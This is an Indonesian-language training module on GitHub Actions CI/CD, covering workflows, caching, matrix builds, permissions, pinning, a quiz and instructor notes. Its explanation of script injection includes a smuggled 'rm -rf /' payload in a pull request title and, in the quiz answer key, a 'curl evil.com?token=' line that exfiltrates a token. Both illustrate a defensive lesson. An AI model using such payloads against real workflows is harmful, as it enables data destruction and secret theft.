## SEKSI 01 — IDENTITAS MODUL

* **ID Modul:** GIT-CORE-08-01
* **Nama Modul:** GitHub Actions CI/CD & Automation
* **Kategori/Track:** 01-Core-Foundations
* **Tingkat Kesulitan:** Advanced
* **Estimasi Waktu Penyelesaian:** 180 Menit (Teori: 45 Menit, Praktik Terpandu: 75 Menit, Lab Mandiri: 60 Menit)
* **Prasyarat (Prerequisites):** 
  * Kemahiran Branching & Merging (Git Workflows, PR lifecycle).
  * Pemahaman format serialisasi data YAML (sintaks, tipe data, multiline string).
  * Konsep dasar CLI/Bash scripting dan pengelolaan dependencies proyek (Node.js/npm, Python/pip, atau sejenisnya).
  * Pemahaman protokol keamanan dasar (Secrets, Environment Variables, Token-based Authentication).
* **Versi Spesifikasi Modul:** v1.2.0

---

## SEKSI 02 — LEARNING OBJECTIVES

Setelah menyelesaikan modul ini, peserta diharapkan mampu:

1. **Menganalisis (Analyze):** Mengurai arsitektur workflow GitHub Actions, siklus hidup event, interaksi runner, serta dependency graph antar-jobs menggunakan dependensi eksplisit (`needs`).
2. **Merancang (Design):** Menyusun blueprint CI/CD pipeline yang modular, efisien (memanfaatkan caching dan matrix strategies), dan secure-by-design (menerapkan prinsip *least privilege* via permission blocks).
3. **Mengimplementasikan (Implement):** Menulis manifest declarative YAML untuk automated continuous integration (linting, testing, building) dan continuous delivery (artifact management, environment gating) di dalam direktori `.github/workflows/`.
4. **Mengevaluasi & Memitigasi (Evaluate & Harden):** Mengidentifikasi celah keamanan rantai pasok (supply chain vulnerabilities) seperti context injection dan unpinned third-party actions, serta menerapkan mitigasi berbasis immutable commit SHA pinning.
5. **Mengoptimalkan (Optimize):** Mengurangi durasi eksekusi workflow dan menekan biaya komputasi runner melalui strategi caching dependencies (`actions/cache`), filter path triggers, dan manajemen konkurensi job (`concurrency`).

---

## SEKSI 03 — KONSEP UTAMA (CONCEPT MAP)

```
GitHub Actions Ecosystem
│
├── 1. Trigger System (Events)
│    ├── Webhook Events (push, pull_request, release)
│    ├── Scheduled Events (POSIX cron syntax)
│    └── Manual/External Events (workflow_dispatch, repository_dispatch)
│
├── 2. Workflow Orchestrator (.github/workflows/*.yml)
│    ├── Global Level (name, permissions, env, concurrency)
│    └── Job Hierarchy
│         ├── Execution Targets (runs-on: ubuntu-latest, self-hosted)
│         ├── Dependencies & DAG (needs: [jobA, jobB])
│         ├── Matrix Builds (strategy.matrix: os, runtime-version)
│         └── Conditional Logic (if: github.ref == 'refs/heads/main')
│
├── 3. Execution Unit (Steps)
│    ├── Actions Marketplace (uses: actions/checkout@v4)
│    ├── Shell Scripts (run: npm test)
│    └── Context Data & Expressions (${{ secrets.TOKEN }}, ${{ github.event_name }})
│
└── 4. Computational Layer (Runners & Persistence)
     ├── Runner Types (GitHub-hosted vs. Self-hosted)
     ├── Data Persistence (actions/upload-artifact, actions/cache)
     └── Security Boundaries (GITHUB_TOKEN, Secrets, Environments, OIDC)
```

---

## SEKSI 04 — MENGAPA INI PENTING (WHY)

Peralihan dari *isolated development* ke *collaborative trunk-based* menuntut verifikasi berkelanjutan atas stabilitas kode sumber. Tanpa sistem otomatisasi:

1. **Sindrom "Works on My Machine":** Perbedaan versi OS, runtime, dependensi lokal, dan konfigurasi environment menyebabkan runtime drift yang baru terdeteksi saat rilis produksi.
2. **High Latency Feedback Loop:** Peer review menjadi lambat karena reviewer terbebani tugas trivial—seperti validasi sintaks, formatting, dan regression testing—yang semestinya ditangani oleh mesin secara deterministik.
3. **Operational Drag:** Manual deployment rentan terhadap *human error*, langkah instruksi yang terlewat, dan ketiadaan audit trail yang memadai.

GitHub Actions memindahkan proses verifikasi ke hulu (*shift-left testing*) langsung di dalam ekosistem repository GitHub. Integrasi bawaan ini memangkas overhead pemeliharaan server CI/CD eksternal (seperti Jenkins), menyediakan isolasi runtime instan berbasis ephemeral VM/container, serta memungkinkan otomatisasi end-to-end mulai dari *code hygiene*, *build validation*, hingga rilis multi-cloud secara terprogram.

---

## SEKSI 05 — APA ITU (WHAT)

GitHub Actions adalah platform Continuous Integration dan Continuous Delivery (CI/CD) terkelola serta *event-driven automation engine* yang terintegrasi secara *native* di dalam GitHub. 

### Komponen Inti:

* **Workflow:** Prosedur otomatisasi yang didefinisikan secara deklaratif dalam file YAML di direktori `.github/workflows/`. Satu repository dapat memiliki banyak workflow independen.
* **Events:** Aktivitas spesifik yang memicu eksekusi workflow (misalnya pembuatan commit, pembukaan Pull Request, pembuatan release tag, atau jadwal cron).
* **Jobs:** Kumpulan *steps* yang dieksekusi pada runner yang sama. Secara default, jobs berjalan secara paralel (*asynchronous*), kecuali didefinisikan dependensi sequential menggunakan atribut `needs`.
* **Steps:** Unit tugas individual yang dieksekusi secara linear di dalam sebuah job. Step dapat berupa instruksi shell (`run`) atau eksekusi reusable component (`uses`).
* **Actions:** Aplikasi mandiri yang dapat digunakan kembali (*reusable block of code*) yang dikonfigurasi untuk menyederhanakan step yang berulang (misalnya checkout repo, konfigurasi runtime, security scan).
* **Runners:** Server komputasi yang mendengarkan event, menjalankan workflow jobs, dan melaporkan statusnya kembali ke GitHub. Terbagi menjadi:
  * *GitHub-hosted runners:* Ephemeral VM (Ubuntu, macOS, Windows) yang disediakan, dipelihara, dan dihapus otomatis oleh GitHub setelah job selesai.
  * *Self-hosted runners:* Mesin yang di-host dan dikonfigurasi sendiri oleh pengguna untuk kebutuhan komputasi khusus, hardware kustom, atau akses ke jaringan lokal (VPC).

---

## SEKSI 06 — BAGAIMANA CARA KERJA (HOW)

Eksekusi GitHub Actions mengikuti siklus hidup event-driven yang presisi:

```
[Developer Git Push] 
       │
       ▼
(GitHub Core API) ──> Webhook Event Ditembakkan (push, pull_request)
       │
       ▼
[Workflow Engine Resolver]
  - Membaca file .github/workflows/*.yml yang cocok dengan filter event
  - Mengonstruksi Directed Acyclic Graph (DAG) berdasarkan dependensi 'needs'
  - Mengevaluasi ekspresi kondisional 'if'
       │
       ▼
[Runner Provisioning]
  - Mengalokasikan VM ephemeral bersih (GitHub-hosted) atau mencocokkan label (Self-hosted)
  - Menginjeksikan GITHUB_TOKEN scoped sementara dan Secret Vault
       │
       ▼
[Job Execution Container/VM]
  - Runner daemon mengeksekusi Steps secara sekuensial:
    ├─ Setup runtime & action downloads
    ├─ Checkout repository
    ├─ Menjalankan sub-shell commands (`run`)
    └─ Mengelola upload artifact / cache
       │
       ▼
[Teardown & Status Synchronization]
  - VM dihancurkan (ephemeral cleanup)
  - Status Check dikirim kembali ke Git Commit SHA (Pending ➔ Success / Failure)
  - Branch protection rules mengevaluasi mergeability
```

### Mekanisme Context & Variable Parsing
Setiap workflow dijalankan dengan konteks yang dinamis (`github`, `env`, `secrets`, `steps`, `runner`). Engine Actions melakukan token substitution terhadap ekspresi `${{ <expression> }}` sebelum mengeksekusi step. Jika sebuah job gagal, engine menghentikan step berikutnya pada job tersebut kecuali step tersebut ditandai dengan fungsi kondisional seperti `always()`, `failure()`, atau `cancelled()`.

---

## SEKSI 07 — DIAGRAM ASCII DETAIL

Berikut adalah arsitektur visual alur eksekusi sebuah pipeline deployment CI/CD berjenjang:

```
+-------------------------------------------------------------------------------+
| GITHUB ACTIONS ORCHESTRATION PIPELINE                                         |
+-------------------------------------------------------------------------------+
                                  
   EVENT TRIGGER: [ git push origin main ]
         |
         +-------------------------------------------------+
         |                                                 |
         v                                                 v
  +--------------+                                  +--------------+
  |  JOB: Lint   |                                  |  JOB: Audit  |
  |  (Parallel)  |                                  |  (Parallel)  |
  +-------+------+                                  +-------+------+
          | (Success)                                       | (Success)
          +-----------------------+-------------------------+
                                  |
                                  v
                  +-------------------------------+
                  | MATRIX: Integration Tests     |
                  | (Parallel sub-jobs)           |
                  +---------------+---------------+
                  | Node 18/Linux | Node 20/Linux |
                  +-------+-------+-------+-------+
                          |               |
                          +-------+-------+
                                  | (All matrix jobs succeed)
                                  v
                  +-------------------------------+
                  | JOB: Build & Package Artifact |
                  | (needs: [test, lint, audit])  |
                  +---------------+---------------+
                                  | (Artifact Uploaded)
                                  v
                  +-------------------------------+
                  | JOB: Deploy to Staging (Env)  |
                  | - OIDC Handshake AWS/GCP      |
                  | - Zero downtime rolling update|
                  +-------------------------------+
```

---

## SEKSI 08 — CONTOH SEDERHANA (SIMPLE EXAMPLE)

Berikut adalah contoh workflow dasar untuk validasi sintaks dan unit test Node.js pada setiap Pull Request ke branch `main`.

File: `.github/workflows/basic-ci.yml`

```yaml
name: Sanity CI

# Menentukan trigger: Jalan saat ada PR yang ditujukan ke branch main
on:
  pull_request:
    branches: [ "main" ]

# Batasi hak akses default token ke read-only untuk keamanan (Least Privilege)
permissions:
  contents: read

jobs:
  validate:
    name: Run Unit Tests
    runs-on: ubuntu-latest
    timeout-minutes: 10 # Hindari infinite loop yang memakan billing quota

    steps:
      # Step 1: Clone kode sumber ke dalam workspace runner
      - name: Checkout Repository
        uses: actions/checkout@v4

      # Step 2: Konfigurasi runtime environment
      - name: Setup Node.js Runtime
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm' # Mengaktifkan caching otomatis untuk package-lock.json

      # Step 3: Install dependensi secara deterministik
      - name: Install Dependencies
        run: npm ci

      # Step 4: Eksekusi unit test runner
      - name: Execute Tests
        run: npm test
```

### Bedah Anatomi Kode:
1. `on.pull_request.branches`: Membatasi eksekusi hanya jika PR menargetkan branch `main`.
2. `permissions: contents: read`: Menghindari token memiliki akses write/admin secara default.
3. `actions/checkout@v4`: Mengambil commit git yang memicu workflow agar dapat diakses oleh runner.
4. `actions/setup-node@v4`: Memasang binary Node.js versi 20 dan mengaitkan package manager npm ke sistem cache runner.
5. `npm ci`: *Clean install* yang membaca `package-lock.json` persis, menolak build jika lockfile tidak sinkron.

---

## SEKSI 09 — CONTOH PRAKTIS (PRACTICAL EXAMPLE)

Berikut adalah pipeline CI/CD produksi yang mencakup:
* Filter trigger berbasis perubahan path.
* Pembatalan otomatis eksekusi build usang (Concurrency Control).
* Matrix build testing (multi-version).
* Upload & download build artifact antar-job.
* Deployment terisolasi menggunakan Environment & Secrets.

File: `.github/workflows/production-pipeline.yml`

```yaml
name: Enterprise Delivery Pipeline

on:
  push:
    branches: [ "main" ]
    paths:
      - 'src/**'
      - 'package*.json'
      - '.github/workflows/production-pipeline.yml'
  pull_request:
    branches: [ "main" ]
    paths:
      - 'src/**'
      - 'package*.json'

# Cancel job yang sedang berjalan jika commit baru di-push pada branch/PR yang sama
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read
  packages: write

jobs:
  code-quality:
    name: Code Quality & Linting
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Sources
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1 (Pinned by SHA)

      - name: Setup Node.js
        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
        with:
          node-version: 20
          cache: 'npm'

      - name: Install Dependencies
        run: npm ci

      - name: Run Linter
        run: npm run lint

  matrix-test:
    name: Test on Node ${{ matrix.node-version }} (${{ matrix.os }})
    needs: [code-quality]
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false # Biarkan runner lain tetap jalan jika salah satu versi runtime gagal
      matrix:
        os: [ubuntu-latest]
        node-version: [18.x, 20.x, 21.x]
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Use Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      - run: npm ci
      - run: npm test -- --coverage
        env:
          CI: true

  build-artifact:
    name: Build & Archive
    needs: [matrix-test]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
        with:
          node-version: 20
          cache: 'npm'
      - run: npm ci
      - name: Compile Production Bundle
        run: npm run build
      
      - name: Archive Production Artifacts
        uses: actions/upload-artifact@5d5d22a31266ced268874388b861e4b58bb5c2f3 # v4.3.1
        with:
          name: app-dist
          path: dist/
          retention-days: 7
          if-no-files-found: error

  deploy-staging:
    name: Deploy to Staging
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    needs: [build-artifact]
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.internal.domain.com
    steps:
      - name: Download Build Artifact
        uses: actions/download-artifact@c850b930e6ba138125429b7e5c93fe70738e9bbf # v4.1.4
        with:
          name: app-dist
          path: dist/

      - name: Execute Deployment
        run: |
          echo "Connecting to target host: ${{ vars.STAGING_HOST }}"
          echo "Deploying artifact securely with injected token..."
          # Simulasi deployment menggunakan secret environment
          ./scripts/deploy.sh --target=${{ vars.STAGING_HOST }} --token=${{ secrets.DEPLOY_AUTH_KEY }}
```

---

## SEKSI 10 — TRADE-OFFS & PERTIMBANGAN

| Dimensi Keputusan | Opsi A | Opsi B | Trade-off & Pertimbangan Arsitektural |
|---|---|---|---|
| **Infrastruktur Runner** | **GitHub-hosted Runners** | **Self-hosted Runners** | GitHub-hosted menjamin isolasi VM per job dan zero maintenance, namun dibatasi oleh hardware (max concurrent limit, spec standar) dan biaya menit. Self-hosted memungkinkan akses bare-metal/GPU dan koneksi langsung VPC privat, namun mewajibkan patching keamanan OS mandiri dan rawan persistence poisoning jika menangani repo publik. |
| **Action Referencing Strategy** | **Tag Referencing** (`@v4`) | **Full Commit SHA** (`@b4ffde6...`) | Tag mudah diperbarui dan dibaca manusia, tetapi rentan terhadap *tag-mutation attack* (supply-chain attack). Commit SHA bersifat immutable secara kriptografis, memberikan jaminan integritas mutlak, namun memerlukan dependabot atau maintenance manual untuk pembaruan versi. |
| **Monorepo Execution Triggers** | **Global Run on Every Push** | **Granular Path Filtering** (`paths: [...]`) | Global run menjamin konsistensi mutlak seluruh dependensi repo, tetapi memboroskan kuota CI dan waktu tunggu antrean. Path filtering memangkas durasi build hingga 80%, namun berisiko melewatkan dependensi lintas direktori (cross-package breakage) jika pattern regex tidak dirancang menyeluruh. |
| **Matrix Strategy Depth** | **Exhaustive Matrix** (Multi OS x All Versions) | **Targeted Smoke Matrix** (Latest OS x LTS Versions) | Exhaustive Matrix menangkap edge-case inkonsistensi platform (Windows vs Linux carriage return, runtime subtle bugs), namun konsumsi komputasi meledak secara eksponensial ($N \times M$). Targeted matrix lebih cost-effective dan cepat untuk loop development harian. |

---

## SEKSI 11 — BEST PRACTICES

1. **Prinsip Least Privilege via Permissions Block:**
   Nonaktifkan read/write token global. Selalu tetapkan izin token secara eksplisit di level root file atau job:
   ```yaml
   permissions:
     contents: read
     pull-requests: write
   ```

2. **Gunakan Commit SHA Pinning untuk Third-Party Actions:**
   Jangan pernah menggunakan mutable tag (misalnya `@v1` atau `@master`) untuk action non-resmi atau komunitas. Pasang dependabot untuk memantau SHA updates:
   ```yaml
   uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # ratchet:actions/checkout@v4.1.1
   ```

3. **Masking & Minimalkan Paparan Secret:**
   Jangan pernah mencetak context mentah ke console (`echo "${{ toJSON(github) }}"`). Jika terpaksa memproses string rahasia di dalam custom script, daftarkan fungsi masking runner:
   ```bash
   run: |
     echo "::add-mask::$DYNAMIC_SECRET_VALUE"
   ```

4. **Kendalikan Konkurensi Pipeline:**
   Gunakan blok `concurrency` dengan pembatalan otomatis (`cancel-in-progress: true`) untuk menghentikan pemborosan runner pada commit PR lama yang telah ditimpa commit baru.

5. **Manfaatkan Cache Dependensi yang Efektif:**
   Gunakan caching bawaan dari setup action (`cache: 'npm'`, `cache: 'pip'`, atau `cache: 'gradle'`) daripada menulis logika `actions/cache` manual, untuk meminimalisasi cache eviction dan ketidakcocokan key hashing.

---

## SEKSI 12 — KESALAHAN UMUM (COMMON MISTAKES)

### 1. Script Injection via Untrusted Context
* **Kode Buruk:**
  ```yaml
  # Vulnerable to Command Injection
  - name: Print Title
    run: echo "Processing PR: ${{ github.event.pull_request.title }}"
  ```
  *Jika title bernilai: `test"; rm -rf /; echo "` , perintah arbitrer akan dieksekusi di shell.*

* **Koreksi:**
  Masukkan context ke dalam environment variable lokal terlebih dahulu sebelum dieksekusi oleh sub-shell:
  ```yaml
  - name: Print Title Safely
    env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: echo "Processing PR: $PR_TITLE"
  ```

---

### 2. Infinite Trigger Loops
* **Penyebab:** Job workflow mengeksekusi `git push` kembali ke repository menggunakan default `GITHUB_TOKEN` pada event `on: push`.
* **Koreksi:** Gunakan filter branch, tambahkan skip directive (`[skip ci]` di pesan commit), atau jangan gunakan default token saat melakukan automated commits jika event downstream tidak sengaja diatur untuk mendengarkan perubahan tersebut.

---

### 3. Menggunakan Self-Hosted Runners untuk Public Repositories
* **Bahaya:** Pengguna luar dapat membuka Pull Request dengan kode berbahaya yang langsung dieksekusi di dalam jaringan lokal infrastruktur host runner Anda.
* **Solusi:** Hanya gunakan GitHub-hosted runners untuk repository publik, atau terapkan approval manual wajib (*Require approval for all outside collaborators*) sebelum workflow berjalan.

---

### 4. Mengabaikan Exit Code Step
* **Kesalahan:** Menjalankan script shell dengan chaining operator yang memakan error atau membiarkan exit code != 0 diabaikan:
  ```yaml
  - run: |
      npm run test-unit || true # Anti-pattern: CI akan selalu hijau meski tes gagal!
  ```
* **Koreksi:** Biarkan proses gagal jika ditemukan error, atau kelola assertion failure secara terkontrol.

---

## SEKSI 13 — LATIHAN HANDS-ON (EXERCISES)

### Skenario Lab
Anda adalah DevOps Engineer yang ditugaskan untuk mengimplementasikan automated pipeline pada repository baru. Pipeline harus memvalidasi integritas kode, mengompilasi aplikasi, mengunggah artefak, dan mencegah merge jika tes gagal.

### Tier 1 — Basic CI Setup (Guided)
1. Buat branch baru bernama `setup-ci`.
2. Di root repository, buat direktori `.github/workflows/`.
3. Buat file bernama `ci-lint-test.yml`.
4. Konfigurasikan trigger untuk mendengarkan event `push` dan `pull_request` pada branch `main`.
5. Tambahkan job `lint` yang melakukan checkout repository, memasang runtime (Node.js/Python/Go sesuai preferensi stack), dan menjalankan command linting.
6. Commit, push branch, dan buka Pull Request ke `main`. Pantau tab **Actions** di GitHub Web UI untuk memverifikasi eksekusi.

---

### Tier 2 — Caching & Matrix Strategy (Intermediate)
1. Modifikasi file `ci-lint-test.yml` untuk menambahkan job `test-matrix`.
2. Definisikan `strategy.matrix` yang menguji aplikasi pada minimal dua versi runtime berbeda (misal: Node 18 dan Node 20).
3. Tambahkan parameter `needs: [lint]` agar matrix test hanya dieksekusi jika job `lint` berhasil.
4. Pastikan caching dependencies aktif sehingga instalasi package pada run kedua berjalan secara signifikan lebih cepat (< 10 detik).
5. Buat sebuah commit sengaja yang merusak unit test pada salah satu versi, push ke branch, dan pastikan GitHub memblokir merge PR serta menandai sub-matrix yang gagal secara terisolasi.

---

### Tier 3 — Secured Artifact Delivery & Branch Protection (Advanced)
1. Tambahkan job ketiga bernama `package` yang berjalan hanya saat ada commit di branch `main` (`if: github.ref == 'refs/heads/main'`).
2. Job ini harus menghasilkan file build (misalnya zip atau folder output `dist/`) lalu mengunggahnya menggunakan `actions/upload-artifact@v4`.
3. Terapkan konfigurasi **Branch Protection Rule** pada GitHub UI untuk branch `main`:
   * Aktifkan: *"Require status checks to pass before merging"*.
   * Pilih checks: `lint` dan seluruh job dari `test-matrix`.
4. Amankan pipeline dengan mengubah seluruh deklarasi action pihak ketiga (`actions/checkout`, `actions/setup-*`, dll) menggunakan Pinning Immutable Commit SHA 40-karakter alih-alih mutable tag.

---

## SEKSI 14 — QUIZ & SELF-ASSESSMENT

Jawab pertanyaan berikut untuk menguji retensi konsep:

1. **Apa perbedaan mendasar antara mengeksekusi step menggunakan `run:` dengan `uses:`?**
   * A. `run:` hanya untuk Windows, `uses:` hanya untuk Linux runner.
   * B. `run:` menjalankan shell commands/scripts lokal di dalam runner, sedangkan `uses:` mengeksekusi reusable action (lokal maupun remote) yang telah dikemas.
   * C. `uses:` dieksekusi secara asynchronous, sedangkan `run:` synchronous.
   * D. `run:` memiliki akses ke secrets, sedangkan `uses:` tidak diizinkan mengakses secrets.

2. **Diberikan konfigurasi YAML berikut:**
   ```yaml
   jobs:
     build:
       runs-on: ubuntu-latest
       steps:
         - run: exit 1
     deploy:
       needs: build
       runs-on: ubuntu-latest
       steps:
         - run: echo "Deploying..."
   ```
   **Apa yang akan terjadi pada job `deploy` saat workflow dieksekusi?**
   * A. Tetap dieksekusi karena `deploy` berjalan pada instance VM yang berbeda.
   * B. Berada dalam status `skipped` karena dependensi job `build` berstatus `failed`.
   * C. Menghasilkan status `cancelled`.
   * D. Menimpa error job `build` menjadi `success`.

3. **Mengapa penulisan `run: echo "${{ github.event.issue.body }}"` dikategorikan sebagai high-risk vulnerability?**
   * A. Mengurangi performa parsing runner YAML parser.
   * B. Runner akan mengalami *out of memory* jika body issue terlalu panjang.
   * C. Membuka celah *Workflow Command Injection*, di mana penyerang dapat menyisipkan payload bash arbitrer melalui teks issue untuk mencuri GITHUB_TOKEN atau secrets.
   * D. Teks markdown tidak didukung di dalam step runner Linux.

4. **Konfigurasi mana yang paling tepat untuk membatasi hak akses GITHUB_TOKEN agar hanya bisa membaca repository files dan menulis laporan check-run?**
   * A. `permissions: write-all`
   * B. `permissions: read-all`
   * C. 
     ```yaml
     permissions:
       contents: read
       checks: write
     ```
   * D. 
     ```yaml
     permissions:
       repository: read
       status: write
     ```

5. **Apa fungsi utama dari blok konfigurasi `concurrency` dengan opsi `cancel-in-progress: true`?**
   * A. Menjalankan semua jobs secara simultan di runner yang sama.
   * B. Membatalkan workflow lama yang sedang berjalan pada branch/group referensi yang sama saat commit baru didorong.
   * C. Mengizinkan bypass status checks pada Pull Request darurat.
   * D. Memaksa step untuk berjalan multi-threading di level CPU VM.

---

### Kunci Jawaban & Rasional

* **1. Jawaban: B.** `run` mengeksekusi perintah shell standar (sh, bash, cmd, pwsh) pada environment runner, sedangkan `uses` memanggil Action mandiri (dibuat via JavaScript, Docker, atau Composite) dari repository publik atau internal.
* **2. Jawaban: B.** Secara default, jika sebuah job gagal (`exit 1`), seluruh downstream jobs yang bergantung padanya lewat `needs` akan otomatis berstatus `skipped`, kecuali didefinisikan kondisi evaluasi khusus seperti `if: always()`.
* **3. Jawaban: C.** GitHub Actions mengevaluasi sintaks `${{ }}` sebelum script dikirimkan ke shell. Jika input user berisi karakter seperti `"; curl evil.com?token=$TOKEN; #`, shell akan mengeksekusinya sebagai perintah terpisah.
* **4. Jawaban: C.** Sintaks resmi GitHub Actions mengizinkan permission scoping granular. Kunci yang valid adalah `contents` dan `checks`.
* **5. Jawaban: B.** Concurrency groups mengelompokkan eksekusi berdasarkan key (misal workflow + git ref). Jika ada eksekusi baru yang masuk saat antrean lama masih berjalan, `cancel-in-progress: true` menghentikan eksekusi lama untuk menghemat kuota komputasi dan menghindari race condition.

---

## SEKSI 15 — REFERENSI & SUMBER BELAJAR LANJUTAN

* **Dokumentasi Resmi:**
  * [GitHub Actions Documentation](https://docs.github.com/en/actions)
  * [Workflow Syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
  * [Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)

* **Open Source Tools & Security Analyzers:**
  * [Actionlint](https://github.com/rhysd/actionlint): Static checker/linter berbasis Go untuk workflow files GitHub Actions.
  * [StepSecurity / Harden-Runner](https://github.com/step-security/harden-runner): Agent audit runtime untuk memantau aktivitas network outbound dan file access di dalam runner.
  * [Zizmor](https://github.com/woodruffw/zizmor): Static analysis tool khusus mendeteksi celah keamanan pada GitHub Actions.

* **Spesifikasi & Standar Industri:**
  * OpenSSF (Open Source Security Foundation) Scorecard - Standard Supply-Chain Security.
  * CIS GitHub Actions Benchmark.

---

## SEKSI 16 — RINGKASAN MODUL (SUMMARY)

```
                       CI/CD CHEATSHEET
+-------------------+---------------------------------------------------+
| Konsep            | Sintaks / Contoh Kunci                            |
+-------------------+---------------------------------------------------+
| Trigger Event     | on: [push, pull_request, workflow_dispatch]       |
| Filter Path       | paths: ['src/**', '!src/**/*.md']                 |
| Concurrency Gate  | concurrency: { group: id, cancel-in-progress: t } |
| Scoped Permission | permissions: { contents: read, id-token: write }  |
| Sequential Jobs   | needs: [previous-job-id]                          |
| Parallel Matrix   | strategy: { matrix: { os: [...], node: [...] } }  |
| Dynamic Variable  | env: { APP_ENV: ${{ vars.ENV_NAME }} }            |
| Dynamic Secret    | env: { API_KEY: ${{ secrets.PROD_API_KEY }} }     |
| Persistence       | actions/upload-artifact@v4                        |
+-------------------+---------------------------------------------------+
```

GitHub Actions menyediakan ekosistem terpadu untuk mengotomatisasi delivery lifecycle perangkat lunak secara event-driven. Arsitektur berbasis declarative YAML yang diletakkan dalam `.github/workflows/` memungkinkan tim engineering menerapkan praktik CI/CD tanpa friksi infrastruktur eksternal. Keberhasilan adopsi Actions di tingkat enterprise bertumpu pada tiga pilar: **Efisiensi** (caching, concurrency, matrix), **Reliabilitas** (dependency DAG, health status checks), dan **Keamanan** (least-privilege permissions, commit SHA pinning, input sanitization).

---

## SEKSI 17 — GLOSARIUM

1. **Artifact:** File atau koleksi file (binari, package zip, coverage report) yang dihasilkan selama eksekusi job, disimpan di infrastruktur GitHub, dan dapat diakses antar-job atau diunduh oleh user.
2. **Cache:** Mekanisme penyimpanan dependensi sementara untuk mempercepat job run dengan menghindari download ulang package lintas run jika file manifest (e.g. `package-lock.json`) tidak berubah.
3. **Concurrency:** Pengaturan yang mengontrol jumlah eksekusi simultan dari workflow atau job dalam grup yang sama untuk menghindari race-condition pada proses rilis.
4. **Context:** Sekumpulan objek variabel bawaan yang berisi informasi tentang workflow run, environment runner, event trigger, dan secrets (misal: `github`, `secrets`, `env`, `runner`).
5. **DAG (Directed Acyclic Graph):** Struktur representasi relasi antar-job yang ditentukan oleh kata kunci `needs`, memastikan dependensi dieksekusi tanpa adanya looping circular.
6. **Ephemeral Runner:** Mesin komputasi runner yang dibuat bersih untuk melayani satu job saja dan langsung dimusnahkan secara permanen setelah job selesai.
7. **GITHUB_TOKEN:** Token autentikasi sementara yang disediakan secara otomatis oleh GitHub untuk setiap eksekusi workflow guna berinteraksi dengan API GitHub.
8. **Matrix Strategy:** Konfigurasi untuk menjalankan satu job secara paralel di berbagai variasi sistem operasi, environment variables, atau runtime packages.
9. **OIDC (OpenID Connect):** Protokol federasi identitas yang memungkinkan GitHub Actions mengautentikasi langsung ke Cloud Provider (AWS, GCP, Azure) tanpa menyimpan credentials jangka panjang (secretless deployment).
10. **Runner:** Host komputasi (VM atau Container) tempat berjalannya runner agent yang mengeksekusi step-step di dalam job.
11. **Secret Masking:** Mekanisme keamanan di mana string sensitif secara otomatis disensor menjadi `***` pada log konsol output runner.
12. **Self-hosted Runner:** Mesin komputasi yang diinstalasi agent GitHub Actions mandiri oleh organisasi dan dihubungkan ke repository/organisasi GitHub.

---

## SEKSI 18 — CATATAN INSTRUKTUR

### Poin Penekanan Materi:
* Tekankan bahwa `.github/workflows/` harus selalu diikutsertakan ke dalam version control. Workflow adalah *code* (**Pipeline as Code**).
* Jangan biarkan peserta terbiasa menggunakan Action pihak ketiga tanpa memverifikasi reputasi pembuatnya (*supply chain risk*). Selalu tegaskan pentingnya commit SHA pinning.
* Soroti perbedaan fungsional antara `vars` (Configuration Variables non-sensitif) dan `secrets` (Credentials sensitif terenkripsi).

### Area Jebakan Peserta (Common Pitfalls):
* Sering terjadi *misalignment indentation* pada YAML (spasi vs tab). Pastikan peserta menggunakan linter editor (seperti ekstensi YAML Red Hat di VS Code).
* Peserta sering keliru menganggap bahwa antar-jobs dalam satu workflow dapat berbagi file lokal secara langsung. Tekankan bahwa setiap job berjalan di **VM/Runner yang terisolasi secara terpisah**, sehingga transfer data wajib menggunakan `upload-artifact` dan `download-artifact`.

### Rekomendasi Setup Lab:
* Pastikan repository pengujian diset sebagai **Private** agar kuota build GitHub Actions gratis tidak terpotong drastis saat proses eksplorasi matrix multi-version oleh peserta.
* Buat target repository memiliki minimal satu suite testing yang cepat (< 30 detik) agar alur feedback lab tidak terhambat oleh durasi eksekusi dependencies.

---

## SEKSI 19 — CHANGELOG & VERSI

| Versi | Tanggal Rilis | Penulis / Maintainer | Ringkasan Perubahan |
|---|---|---|---|
| **v1.2.0** | 2024-04-10 | Senior Technical Curriculum Architect | Penambahan mitigasi Injection Vulnerability, pengalihan dependensi ke commit SHA pinning, pembaruan ke Actions Checkout v4 dan Upload Artifact v4. |
| **v1.1.0** | 2023-09-15 | Core DevOps Team | Penambahan sub-bab Concurrency Management dan integrasi caching bawaan setup actions. |
| **v1.0.0** | 2023-01-20 | Curriculum Development Team | Rilis inisial materi GitHub Actions CI/CD Foundations. |

---

## SEKSI 20 — NAVIGASI KURIKULUM

* **Modul Sebelumnya:** `GIT-CORE-07-02: Advanced Git Merge Strategies & Conflict Resolutions`
* **Modul Saat Ini:** `GIT-CORE-08-01: GitHub Actions CI/CD & Automation`
* **Modul Berikutnya:** `GIT-CORE-08-02: Custom Composite Actions, OIDC Cloud Authentication & Release Management`